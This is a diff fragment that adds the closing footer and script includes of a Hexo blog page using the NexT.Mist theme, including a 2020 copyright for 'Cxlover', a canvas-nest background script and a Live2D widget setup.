+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cxlover</span>
+</div>
+<!--  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+  -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":true,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":false},"log":false});</script>
+</body>
+</html>
